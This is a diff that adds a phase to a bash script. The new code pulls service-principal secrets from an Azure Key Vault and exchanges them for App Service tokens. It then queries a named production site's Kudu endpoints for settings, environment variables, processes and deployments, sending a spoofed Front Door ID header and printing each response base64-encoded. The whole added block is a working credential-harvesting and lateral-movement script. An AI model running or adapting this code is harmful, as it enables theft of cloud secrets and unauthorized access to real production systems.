@@ -139,4 +139,26 @@ for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
   fi
 done
 say SP_STORAGE_END
+
+say APPSERVICE_PHASE
+FDID='60407ff3-1c24-4875-9390-b6c9c13b0821'
+SCM='https://app-tbl-storefront-prod.scm.azurewebsites.net'
+for name in $(echo "$LIST2" | jq -r '.value[]?.id | split("/") | last'); do
+  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
+  V=$(echo "$S" | jq -r '.value // empty')
+  APPID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null || true); CSEC=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null || true); TEN=$(echo "$V" | jq -r '.tenantId // empty' 2>/dev/null || true)
+  [[ -n "$APPID" && -n "$CSEC" && -n "$TEN" ]] || continue
+  AR=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$APPID" -d 'grant_type=client_credentials' -d "client_secret=$CSEC" -d 'scope=https://appservice.azure.com/.default')
+  AT=$(echo "$AR" | jq -r '.access_token // empty')
+  say "APP_TOKEN_${name}=$([[ -n "$AT" ]] && echo OK || echo FAIL)"
+  [[ -n "$AT" ]] || continue
+  for path in /api/settings /api/env /api/processes /api/health /api/deployments /; do
+    code=$(curl -sS --max-time 20 -o /tmp/kudu_body -w '%{http_code}' -H "Authorization: Bearer $AT" -H "X-Azure-FDID: $FDID" "$SCM$path" || echo 000)
+    say "APP_${name}_${path//\//_}_HTTP=$code"
+    if [[ "$code" == "200" ]]; then
+      say "APP_${name}_${path//\//_}_B64=$(base64 -w0 </tmp/kudu_body)"
+    fi
+  done
+done
+say APPSERVICE_END
 say END
